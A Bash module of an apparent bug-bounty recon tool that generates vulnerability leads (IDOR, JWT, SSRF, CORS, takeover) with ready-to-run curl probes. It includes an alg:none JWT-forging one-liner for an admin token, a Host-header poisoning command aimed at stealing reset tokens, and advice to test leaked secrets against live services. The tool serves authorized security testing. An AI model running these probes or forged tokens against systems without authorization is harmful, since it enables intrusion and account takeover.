#!/usr/bin/env bash
# HuntOps — the manual-candidate generator (the money engine).
# Emits CAND rows with copy-paste repro curl commands. Active probes are
# throttled; IDOR/authz emitters respect --test-account.
set -u

CD="$W/candidates"
mkdir -p "$CD"

# suggested CVSS for an impact class (from data/impact-classes.conf)
_class_cvss() { awk -F'|' -v c="$1" '$1==c{print $2}' "$IMPACT_CLASSES" 2>/dev/null | head -1; }

run_candidates() {
  log "candidate engine — generating manual-validation leads"
  [ -n "${TEST_ACCOUNT:-}" ] && ok "test-account mode: $TEST_ACCOUNT (IDOR/authz = high confidence)"
  local before; before=$(count_lines "$CANDIDATES")

  _cand_idor
  _cand_jwt
  _cand_graphql
  _cand_ssrf
  _cand_open_redirect
  _cand_race
  _cand_admin_authz
  _cand_secrets
  _cand_cloud
  _cand_takeover
  _cand_cors

  local after; after=$(count_lines "$CANDIDATES")
  ok "candidate engine done: $((after - before)) new candidates (total $after)"
}

# ---- 1. IDOR / BOLA (numeric/sequential object IDs) --------------------------
_cand_idor() {
  local pool="$W/urls/param-urls.txt $W/urls/api-endpoints.txt $W/urls/historical.txt"
  local hit host title ev cvss
  grep -haoE "[?&][a-z_]*(id|user|account|subscriber|sub|order|file|doc|member|invoice|payment|ref)[a-z_]*=[0-9]{4,}" $pool 2>/dev/null \
    | sort -u | head -20 | while read -r m; do
      host="$DOMAIN"; title="IDOR candidate: enumerable parameter $m"
      ev="Sequential/numeric identifier found in a URL parameter — classic broken object-level authorization (OWASP A01)."
      cvss=$(_class_cvss idor)
      if [ -n "${TEST_ACCOUNT:-}" ]; then
        add_candidate idor "$host" "$title" "high" "$ev" \
          "# with your test account: replace ID with yours, then step ±1: curl -sk 'https://$host/?${m#?}' -w '%{http_code}'; compare bodies" \
          "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" "$cvss" "idor"
      else
        add_candidate idor "$host" "$title" "low" "$ev" \
          "# set --test-account <your@email> and only probe IDs you OWN: curl -sk 'https://$host/?${m#?}'" \
          "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" "$cvss" "idor-manual"
      fi
    done

  # /api/.../<numeric> object references
  grep -haoE "/api/[a-zA-Z0-9_./-]*/[0-9]{4,}" $pool 2>/dev/null | sort -u | head -10 \
    | while read -r p; do
      cvss=$(_class_cvss bola)
      add_candidate bola "$DOMAIN" "BOLA candidate: $p" "low" \
        "Numeric object reference in API path. Test object A with a second account's token." \
        "# curl -sk -H 'Authorization: Bearer <token-A>' 'https://$DOMAIN$p'; then access object owned by account B with token A" \
        "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" "$cvss" "bola"
    done
}

# ---- 2. JWT alg manipulation --------------------------------------------------
_cand_jwt() {
  local toks; toks=$(grep -aoE "eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}" "$W/urls/secrets.txt" 2>/dev/null | sort -u | head -5)
  [ -z "$toks" ] && return 0
  echo "$toks" | while read -r t; do
    local header; header=$(cut -d. -f1 <<< "$t" | tr '_-' '/+' | base64 -d 2>/dev/null)
    local alg; alg=$(grep -oE '"alg"\s*:\s*"[^"]+"' <<< "$header" | head -1)
    if grep -qiE '"none"|HS256' <<< "$header"; then
      add_candidate auth-bypass "$DOMAIN" "JWT with ${alg:-unknown} — test alg:none / weak-signing" "medium" \
        "JWT header allows alg tampering candidates. Decode: $header" \
        "# forge alg:none token: python3 -c \"import base64,json;print(base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()+'.'+base64.urlsafe_b64encode(json.dumps({'sub':'<victim>','admin':1}).encode()).rstrip(b'=').decode()+'.')\" then send as Authorization: Bearer <token>" \
        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_for_JSON_Web_Tokens" "$(_class_cvss auth-bypass)" "jwt"
    fi
  done
}

# ---- 3. GraphQL introspection (active, small) ---------------------------------
_cand_graphql() {
  local live="$W/web/live-urls.txt"
  [ -f "$live" ] || return 0
  local host paths p
  head -3 "$live" | awk '{print $1}' | while read -r base; do
    while read -r p; do
      [ -z "$p" ] && continue
      local body; body=$(wreq -X POST "$base$p" -H 'Content-Type: application/json' \
        -d '{"query":"{__schema{types{name}}}"}' 2>/dev/null)
      if grep -q '__schema' <<< "$body" && grep -qE '"types"' <<< "$body"; then
        add_candidate graphql-introspection "$base" "GraphQL introspection open at $p" "high" \
          "Introspection query returns schema — enumerate queries/mutations for deeper impact (IDOR/XXE/RCE)." \
          "# curl -sk -X POST '$base$p' -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'" \
          "https://owasp.org/www-project-web-security-testing-guide/" "$(_class_cvss graphql-introspection)" "graphql"
      fi
    done < "$GRAPHQL_PATHS"
  done
}

# ---- 4. SSRF-prone params -----------------------------------------------------
_cand_ssrf() {
  local pool="$W/urls/param-urls.txt $W/urls/api-endpoints.txt"
  grep -haoE "[?&](url|uri|image|img|next|dest|redirect|callback|webhook|return|target|link|u|r|src|path|file|load|fetch|download|proxy|host|domain|feed|src)=[^&]*" $pool 2>/dev/null \
    | grep -vE "oembedResolve" | sort -u | head -15 | while read -r m; do
      add_candidate ssrf "$DOMAIN" "SSRF-prone parameter: $m" "low" \
        "Parameter looks like a fetch/redirect target. Point it at a canary you control (interact.sh). /api/oembedResolve is OUT OF SCOPE for this program." \
        "# curl -sk 'https://$DOMAIN/?${m#?}' with value 'https://YOUR.canary.interact.sh/'; watch for callback" \
        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery" "$(_class_cvss ssrf)" "ssrf"
    done
}

# ---- 5. Open redirect (active, small) ----------------------------------------
_cand_open_redirect() {
  local live="$W/web/live-urls.txt"
  [ -f "$live" ] || return 0
  head -3 "$live" | awk '{print $1}' | while read -r base; do
    for p in "/login" "/auth" "/signin" "/oauth/authorize" "/redirect" "/refer"; do
      local loc; loc=$(curl -skI --max-time 12 "$base$p?next=//evil.example.com" 2>/dev/null | tr -d '\r' | grep -i '^location:' | head -1)
      if grep -qiE "//evil\.example\.com" <<< "$loc"; then
        add_candidate open-redirect "$base" "Open redirect via ?next on $p" "high" \
          "Server reflects attacker URL in Location header: $loc" \
          "# curl -skI '$base$p?next=//evil.example.com'" \
          "https://owasp.org/www-project-web-security-testing-guide/" "$(_class_cvss open-redirect)" "open-redirect"
      fi
    done
  done
}

# ---- 6. Race conditions -------------------------------------------------------
_cand_race() {
  local rob="$W/urls/robots.txt"
  local seams=""
  [ -f "$rob" ] && seams=$(grep -aoE "^/(refer|invite|claim|redeem|coupon|checkout|payment|signup|upgrade|transfer)[a-zA-Z0-9_/-]*" "$rob" | sort -u)
  seams="${seams:-/refer/ /invite/ /claim}"
  echo "$seams" | sort -u | head -10 | while read -r p; do
    [ -z "$p" ] && continue
    add_candidate logic-race "$DOMAIN" "Race condition candidate: $p" "low" \
      "State-changing endpoint (referral/claim/checkout). Race N parallel identical requests; >1 success = bug." \
      "# for i in \$(seq 1 20); do curl -sk -X POST 'https://$DOMAIN$p' --data 'code=TEST' & done; wait  (verify with Turbo Intruder/racelyzer)" \
      "https://owasp.org/www-project-web-security-testing-guide/" "$(_class_cvss logic-race)" "race"
  done
}

# ---- 7. Admin / authz / host-header ------------------------------------------
_cand_admin_authz() {
  local live="$W/web/live-urls.txt"
  [ -f "$live" ] || return 0
  head -3 "$live" | awk '{print $1}' | while read -r base; do
    while read -r p; do
      [ -z "$p" ] && continue
      add_candidate admin-access "$base" "Admin/debug path to verify: $p" "low" \
        "Endpoint from admin/actuator/environment list — check for unauthenticated exposure." \
        "# curl -sk -o /dev/null -w '%{http_code} %{redirect_url}' '$base$p'   then inspect 200/403 and body" \
        "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" "$(_class_cvss admin-access)" "admin"
    done < "$ADMIN_PATHS"
    add_candidate logic-flaw "$base" "Host-header poisoning: test password-reset / email-change" "low" \
      "If the app builds reset links from Host, poison it to steal tokens." \
      "# curl -sk -X POST '$base/api/forgot-password' -H 'Host: evil.example.com' --data 'email=<your-test-account>'  then check the email link host" \
      "https://portswigger.net/web-security/host-header" "$(_class_cvss logic-flaw)" "host-header"
  done
}

# ---- 8. Secrets ------------------------------------------------------------------
_cand_secrets() {
  local sec="$W/urls/secrets.txt"
  [ -f "$sec" ] || return 0
  while read -r s; do
    [ -z "$s" ] && continue
    local cls=secrets
    grep -qE "AKIA[0-9A-Z]{16}" <<< "$s" && cls=secrets
    add_candidate "$cls" "$DOMAIN" "Potential secret in JS/history" "low" \
      "Secret-looking string surfaced by regex/gitleaks/gf. Verify it is live before reporting (many are false positives)." \
      "# grep -rn '$s' $W/js/ ; try it against the service (aws sts get-caller-identity / stripe etc.) — do NOT report without proof" \
      "https://owasp.org/www-project-web-security-testing-guide/" "$(_class_cvss secrets)" "secret"
  done < "$sec"
}

# ---- 9. Cloud storage buckets -----------------------------------------------------
_cand_cloud() {
  local labels
  labels=$(awk -F. '{print $1}' "$W/subdomains/all-passive.txt" 2>/dev/null | sort -u | head -15)
  [ -z "$labels" ] && labels="$DOMAIN"
  echo "$labels" | while read -r l; do
    for u in "https://$l.s3.amazonaws.com" "https://storage.googleapis.com/$l" "https://$l.blob.core.windows.net"; do
      local code body; body=$(curl -skI --max-time 10 "$u" 2>/dev/null); code=$(head -1 <<< "$body" | awk '{print $2}')
      if [ "$code" = "200" ] || [ "$code" = "403" ]; then
        add_candidate cloud-storage "$u" "Possible exposed cloud bucket ($code)" "low" \
          "HTTP $code on bucket URL. 200+ListBucket/listing XML or 403 (bucket exists) = test for public access." \
          "# curl -sk '$u' | head -50   # check for <ListBucketResult>" \
          "https://owasp.org/www-project-web-security-testing-guide/" "$(_class_cvss cloud-storage)" "cloud"
      fi
    done
  done
}

# ---- 10. Subdomain takeover (from CNAME chain) -------------------------------------
_cand_takeover() {
  local cn="$W/subdomains/cnames.txt"
  [ -f "$cn" ] || return 0
  while read -r line; do
    local host cname
    host="${line%% -> *}"; cname="${line##* -> }"
    case "$cname" in
      *.s3.amazonaws.com|*.github.io|*.herokuapp.com|*.herokussl.com|*.netlify.app|*.vercel.app|*.now.sh|*.readme.io|*.gitlab.io|*.pantheonsite.io|*.azurewebsites.net|*.cloudapp.azure.com|*.trafficmanager.net|*.blob.core.windows.net|*.surge.sh|*.uservoice.com|*.wordpress.com|*.tumblr.com|*.zendesk.com|*.freshdesk.com|*.bitbucket.io|*.fastly.net|*.fastlylb.net|*.cargocollective.com|*.unbouncepages.com|*.tilda.ws)
        add_candidate takeover "$host" "Takeover candidate: CNAME → $cname" "medium" \
          "Host points at a takeover-prone provider. Check the provider endpoint returns 'not found' → claimable." \
          "# dig +short $host CNAME; curl -sk 'https://$host/' | grep -i 'not found\|does not exist\|no such'" \
          "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover" "$(_class_cvss takeover)" "takeover"
        ;;
    esac
  done < "$cn"
}

# ---- 11. CORS origin reflection (active, small) ------------------------------------
_cand_cors() {
  local live="$W/web/live-urls.txt"
  [ -f "$live" ] || return 0
  head -3 "$live" | awk '{print $1}' | while read -r base; do
    for o in "https://evil.example.com" "https://$DOMAIN.evil.com" "null"; do
      local hdr; hdr=$(curl -sk -D- -o /dev/null --max-time 12 -H "Origin: $o" "$base/" 2>/dev/null | tr -d '\r')
      local acao acac
      acao=$(grep -i '^access-control-allow-origin:' <<< "$hdr" | head -1)
      acac=$(grep -i '^access-control-allow-credentials:' <<< "$hdr" | head -1 | grep -i true)
      if [ -n "$acao" ] && grep -q "evil" <<< "$acao" && [ -n "$acac" ]; then
        add_candidate cors "$base" "CORS: reflected origin + credentials at /" "high" \
          "Reflected ACAO ($acao) with Allow-Credentials — cross-origin authenticated reads possible." \
          "# curl -sk -D- -o /dev/null -H 'Origin: $o' '$base/' | grep -i 'access-control'" \
          "https://portswigger.net/web-security/cors" "$(_class_cvss cors)" "cors"
      fi
    done
  done
}
